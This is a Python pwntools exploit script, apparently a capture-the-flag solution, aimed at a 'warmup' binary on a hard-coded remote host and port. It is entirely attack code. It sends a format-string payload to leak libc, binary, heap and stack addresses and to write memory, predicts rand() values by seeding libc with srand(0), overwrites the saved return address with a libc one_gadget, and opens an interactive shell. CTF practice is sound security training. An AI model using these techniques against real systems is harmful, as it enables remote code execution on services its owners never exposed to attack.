#!/usr/bin/env python3
from pwn import *
import ctypes


context.terminal = ['cmd.exe', '/c', 'start', 'wsl.exe', '-d', 'Debian', 'bash', '-c']
context.arch = 'amd64'
host = '34.171.160.79'
port = 9998
elf_name = './warmup_patched'
elf = ELF(elf_name)
libc = ELF('./libc-2.23.so')
script = '''
breakrva 0x000000000000D30
breakrva 0x000000000000F42
breakrva 0x0000000000000F52
breakrva 0x0000000000001111
c
'''
# script += 'c\n'
if args.LOCAL:
    p = process(elf_name)
elif args.GDB:
    p = process(elf_name)
    gdb.attach(p, gdbscript=script)
else:
    p = remote(host, port)

LIBC = ctypes.cdll.LoadLibrary('./libc-2.23.so')
LIBC.srand(0)

p.sendlineafter(b'How much money you want? ', b'123123')

payload = f'%13$lln%{0x58}c%12$hhn'.encode()
payload += b'zzzz'
payload += b'%1$p%6$p%7$p%9$p'

p.sendlineafter(b'Player name: ', payload)

p.recvuntil(b'zzzz')
recv = p.recvline()
libc_base = int(recv[:14], 16) - 0x3c56a3
log.info("leak libc " + hex(libc_base))
libc.address = libc_base
bin_base = int(recv[14:28], 16) - 0x1280
log.info("bin base " + hex(bin_base))
elf.address = bin_base
heap_feedback = int(recv[28:42], 16) - 0x418
log.info("heap_feedback " + hex(heap_feedback))
stack_main_ret = int(recv[42:42 + 14], 16) + 0x48
log.info("stack_main_ret " + hex(stack_main_ret))

randnum_1 = LIBC.rand()
randnum_2 = LIBC.rand()
vote = stack_main_ret - randnum_2 - heap_feedback
log.info("randnum_1 " + hex(randnum_1))
log.info("vote " + hex(vote))

p.sendlineafter(b"Your vote (= 0 to exit): ", str(vote).encode())
p.sendlineafter(b"Your number: ", str(randnum_1).encode())

p.sendlineafter(b"Your vote (= 0 to exit): ", str(0).encode())

one_gadget = 0xf1247 + libc_base    
p.sendlineafter(b"Send to author your feeback: ", p64(one_gadget))    
    
p.interactive()
